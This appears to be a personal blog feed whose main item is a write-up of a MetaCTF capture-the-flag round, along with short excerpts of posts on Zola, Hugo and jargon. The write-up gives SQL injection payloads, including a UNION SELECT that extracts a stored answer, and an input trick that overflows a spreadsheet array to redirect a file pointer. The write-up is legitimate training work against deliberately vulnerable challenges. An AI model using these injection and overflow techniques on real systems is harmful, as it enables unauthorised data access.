item.title: Ô∏èA Christmas Puzzle
item.author: PsypherPunk
item.description:
With Advent of Code running a little shorter this year, I put together a quick puzzle with which I challenged the folks at work.

With the exception of one person who, over the course of several days and numerous guesses, managed to coax an LLM into giving them the right answer, it is as yet unsolved.

So here it is: there‚Äôs a message hidden in this file‚Äîwhat is it?

a-christmas-carol.b64

item.title: Ô∏èüè¥ MetaCTF August 2025 Flash CTF
item.author: PsypherPunk
item.description:
A free monthly mini CTF competition organized by MetaCTF with support from Antisyphon Training, TCM Security, and Simply Cyber Academy. There will be 5 challenges and you will have 2 hours to solve as many as you can. This CTF will include both beginner and difficult challenges.

Details here: https://app.metactf.com/join/aug2025.

Baby Something

How does the song go again? Baby something do do do do do do‚Ä¶

Download the artifact here.

The provided packet capture is involves only a single HTTP request/response, the latter of which, courtesy of Wireshare (as hinted at in the description‚Äîthanks for that earworm), contains HTML and the flag:

<!doctype html>
<html lang="en">
  <head><meta charset="utf-8"><title>Baby Shark Fan Page</title></head>
  <body>
    <h1>Baby Shark Fan Page</h1>
    <p>doo doo doo doo doo doo √∞¬¶</p>
    <p>We love Baby Shark and all things sharky.</p>
     <pre style="border:1px solid #ddd;padding:8px;">MetaCTF{w1r3sh4rk_do0_d0o_d00_d00_doo_do0}</pre>
  </body>
</html>

All About Flags

I wrote a command line application all about flags! Can you take a look at it for me?

There‚Äôs downloads both for Windows and Linux, but they‚Äôre functionally the same, just download the version for whichever OS you prefer.

There might be more to this one but the flag appears in plaintext in the binary:

‚ùØ strings all-about-flags | sed -rn 's@^.*(MetaCTF\{.+\}).*$@\1@p'
MetaCTF{I_f1y_m4ny_fl4g5_4nd_c4p7ur3_3v3n_m0r3}

Rainbow Box

Several planes crashed in the same location, but we could only find one black box. All we found was this weird rainbow image? Can you make anything out?

Download the image here.

Planes? Bit planes? Geddit?

Taking a leaf out of this article on Image Steganography with Python, the code therein reveals this:

‚Ä¶so characters are indeed hidden in the image but this doesn‚Äôt quite make them legible (as it‚Äôs for gray-scale images, as per that article.)

I managed to produce some code that extends the above and produces this:

‚Ä¶which has ‚Äú‚Ä¶all the right notes but not necessarily in the right order.‚Äù

However, a quick search for ‚Äúbitplane steganography tool‚Äù turns up StegOnline which manages the above with little effort: MetaCTF{fly-b1tpl4ne}.

On The Grid

I was hanging out on Granite Beach when I found a message in a bottle, it didn‚Äôt say very much though. Can you help me figure out where it came from? Here‚Äôs the transcript:

Help! 4V FH 246 677

The answer to the challenge is the name of the location the message was most likely written at.

Some searching suggests that ‚ÄúFV‚Ä¶‚Äù might be a ‚ÄúMilitary Grid Reference System‚Äù. Given the name of the challenge, that sounds promising.

This site, MGRS Converter: Military Grid Reference System, converts that value to a latitude of 56.53711577 and longitude of -156.97382099, which Google Maps shows to be Foggy Cape.

Super Quick Logic Invitational

I‚Äôll take ‚ÄúRather Vexing‚Äù for 500 Alex.

This new trivia game is pretty fun, but one of the challenges is impossible! ‚ÄúWhat is the flag for this CTF challenge?‚Äù, how would I know?! Maybe you‚Äôll fare better?

The site presents ‚Äú201 unique problems to solve each game, you‚Äôll never believe what‚Äôs the answer to challenge 201!‚Äù, presumably the flag‚Ä¶?

‚ÄúWhat is the largest prime factor of 625?‚Äù. After a surprising number of lucky guesses, it seems that the classic ' OR 1=1 -- works‚Äîthe site is vulnerable to SQLi.

Using a classic UNION attack, via 'UNION SELECT 'A', 'B', 'C', 'D' --, shows that there are 4 parameters being returned. However, those values don‚Äôt show up until the site‚Äôs 30 second countdown has completed, at which point C shows up in the Answer value.

Thankfully, forcing an error by closing the ' and passing in any ol‚Äô garbage, like '!"¬£$%^&*()_, results in an error:

{
    "error":"unrecognized token: \"!\"",
    "query":"SELECT * FROM problems WHERE id = 164 AND answer = ''!\"\u00a3$%^&*()_'"
}

‚Ä¶revealing both the table and column of interest. Putting those discoveries together and passing:

' UNION SELECT '', '', (SELECT answer FROM problems WHERE id = 201), '' --

‚Ä¶results in a page containing:

Answer: MetaCTF{wh4t_1s_7h3_fl4g_f0r_7hi5_ch5l1eng3}

Spreadsheet

I can‚Äôt afford Office 365 so I‚Äôve decided to roll my own. What could possibly go wrong!

My spreadsheet application is a work in progress but feel free to give it a try. You can download my program here.

The ‚Äúspreadsheet‚Äù app. is a TUI tool allowing editing, loading, saving and printing of‚Äîas you might guess‚Äîa spreadsheet:

‚ùØ ./spreadsheet.bin b
Options: (P)rint, (E)dit, (L)oad, (S)ave, (Q)uit

As can be seen from the print_spreadsheet function (courtesy of Ghidra), it actually occupies a static 10x10 array (of char *):

void print_spreadsheet(void)

{
  int row;
  int col;

  putchar(9);
  for (col = 0; col < 10; col = col + 1) {
    printf("%c\t",(ulong)(col + 0x41));
  }
  putchar(10);
  for (row = 0; row < 10; row = row + 1) {
    printf("%2d\t",(ulong)(row + 1));
    for (col = 0; col < 10; col = col + 1) {
      printf("%4s\t",spreadsheet[row][col]);
    }
    putchar(10);
  }
  return;
}

The filename, spreadsheet.csv, is also static and, more importantly, its pointer sits right next to the above array on the stack.

edit_spreadsheet contains no validation around which characters can be entered into a ‚Äúcell‚Äù, so it‚Äôs possible to write additional columns:

MPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,
EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,EMPTY,X,flag.txt,

Equally, load_spreadsheet doesn‚Äôt correctly validate the columns on read, just using strtok to catch instances of ,:

void load_spreadsheet(void)

{
‚Ä¶
  else {
    row = 0;
    while ((pcVar3 = fgets(line,0x400,__stream), pcVar3 != (char *)0x0 &&
           (sVar2 = strlen(line), 1 < sVar2))) {
      col = 0;
      val = strtok(line,",");
      while (val != (char *)0x0) {
        free(spreadsheet[row][col]);
        pcVar3 = strdup(val);
        spreadsheet[row][col] = pcVar3;
        val = strtok((char *)0x0,",");
        col = col + 1;
      }
      row = row + 1;
    }
    fclose(__stream);
    puts("Spreadsheet loaded!");
  }
‚Ä¶
}

In the above example, flag.txt would be read in as an additional value after the 10x10 array‚Ä¶right into the filename pointer!

Once that‚Äôs done, loading the file again would cause flag.txt to be read, after which it should be possible to display the flag:

‚ùØ nc kubenode.mctf.io 31009
Options: (P)rint, (E)dit, (L)oad, (S)ave, (Q)uit
 > E
Enter cell (i.e. 'B7'): J10
Enter new value: X,flag.txt
Value updated!
Options: (P)rint, (E)dit, (L)oad, (S)ave, (Q)uit
 > S
Spreadsheet saved!
Options: (P)rint, (E)dit, (L)oad, (S)ave, (Q)uit
 > L
Spreadsheet loaded!
Options: (P)rint, (E)dit, (L)oad, (S)ave, (Q)uit
 > L
Spreadsheet loaded!
Options: (P)rint, (E)dit, (L)oad, (S)ave, (Q)uit
 > P
        A       B       C       D       E       F       G       H       I       J
 1      MetaCTF{c0mm4_c0mm4_c0mm4_c0mma_c0mm4_ch4m3l30n}
        EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 2      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 3      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 4      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 5      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 6      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 7      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 8      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
 9      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY
10      EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY   EMPTY      X

item.title: Ô∏èüêç Polyfactory and Patients
item.author: PsypherPunk
item.description:
PyData Leeds was recently fortunate enough to play host to the ‚ÄúNHS Data Community Takeover‚Äù. To preface things with a quote from that blog post:

Unfortunately, quality test data is non-existent as some (if not most) NHS organisations, especially data that reflects real-life use cases and the depth of complexity the real world represents. This is particularly challenging given the weight of this dataset, it‚Äôs real people‚Äôs healthcare data and it deserves the respect we give it.

item.title: üîÅ Zola, okay we'll do it your way.
item.author: PsypherPunk
item.description: I‚Äôd previously mentioned that I was maintaining a fork of Zola to allow me to use my old deployment model: that of having a separate, public repo. which housed my built static-site and referencing this as a Git submodule residing the public subdirectory.

item.title: üí• From Hugo to Zola
item.author: PsypherPunk
item.description:
Why Are We Here Again?

While I outlined my earlier selection of Hugo as the static-site-generator of choice in a previous post, it‚Äôs finally time to admit that Go and I aren‚Äôt getting on. It‚Äôs not you, it‚Äôs me (except it‚Äôs totally you.)

And it‚Äôs more than a little Rust, to be honest.

item.title: üíæ Jargon
item.author: PsypherPunk
item.description:
Jargon, do you grok it?

I recently had a weird conversation on Teams (yes, we use Microsoft Teams at work; don‚Äôt judge us); triggered by a question in a recent Postman user-survey, it prompted a discussion around ‚Äúunique terminology‚Äù in sofware development and to what degree each of us had been exposed.
